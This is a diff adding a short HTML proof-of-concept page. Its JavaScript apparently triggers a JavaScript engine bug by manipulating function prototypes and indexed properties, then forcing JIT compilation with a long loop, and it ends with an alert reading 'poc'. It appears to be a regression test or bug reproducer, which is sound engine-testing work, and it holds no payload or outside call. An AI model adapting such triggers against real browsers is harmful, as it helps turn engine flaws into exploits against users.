@@ -1,0 +1,25 @@
+<script>
+function SDD() {
+    function foo() {}
+    foo[0] = 0;
+    foo.prototype = 0;
+
+    try {
+        throw 0;
+    } catch(e) {
+        [0].forEach(bar);
+    }
+
+    function bar() {
+        foo[200];
+    }
+
+    for (var i = 0; i < 0x2000000; ++i) {}
+}
+
+SDD();
+SDD();
+SDD();
+alert('poc');
+</script>
+poc!!
